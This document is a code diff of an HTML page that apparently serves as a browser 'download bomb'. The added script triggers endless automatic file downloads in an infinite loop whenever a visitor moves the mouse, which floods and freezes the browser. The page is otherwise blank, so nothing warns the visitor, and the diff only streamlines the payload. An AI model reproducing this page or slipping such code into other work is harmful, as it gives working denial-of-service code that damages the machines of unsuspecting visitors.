@@ -1,38 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-
 <style type="text/css">
-	html, body {
-    width: 100%;
+       html, body {
+     width: 100%;
     height: 100%;
 }
 </style>
 
 <script> 
-function download(g, h, j) {
-	var k = new Blob([g], { type: j });
+function download() {
+	var k = new Blob([10]);
 	var l = document.createElement("a"),
-			m = URL.createObjectURL(k);		
-			l.href = m, l.download = h, l.click(), setTimeout(function() {}, 0)
+		m = URL.createObjectURL(k);		
+		l.href = m, l.download = "", l.click(); 
 }
 
 function bomb_character() {
-	var g = Math.random().toString(36).substring(20),
-			h = Math.floor(50 * Math.random() + 25);
-	while (true) download(h, g, g)
+	while (true) download();
 }
-
-
-function intervalCall() {
-  setInterval(function(){ 
-    bomb_character(); }, 1);
-}
-
 </script>
+
 </head>
 
-<body style="background:#00000; cursor: url('cursor.png') 128 128, crosshair;" onmousemove="intervalCall();">
+<body onmousemove="bomb_character();">
+
 </body>
 </body>
 </html>
